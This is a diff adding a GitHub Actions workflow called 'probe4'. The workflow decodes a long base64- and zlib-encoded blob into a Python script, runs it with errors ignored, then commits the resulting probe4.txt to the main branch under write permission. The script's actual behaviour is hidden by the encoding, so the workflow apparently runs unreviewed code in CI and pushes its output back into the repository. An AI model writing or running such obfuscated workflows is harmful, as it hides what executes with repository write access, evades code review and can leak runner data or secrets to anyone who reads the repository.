@@ -1,0 +1,24 @@
+name: probe4
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: probe
+        continue-on-error: true
+        run: |
+          echo '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' | base64 -d | python3 -c "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > probe4.py
+          python3 probe4.py
+      - name: commit
+        run: |
+          git config user.name "bot"
+          git config user.email "bot@users.noreply.github.com"
+          git add probe4.txt
+          git diff --cached --quiet && exit 0
+          git commit -m "probe4"
+          for i in 1 2 3 4 5; do git pull --rebase origin main && git push && break; sleep 5; done
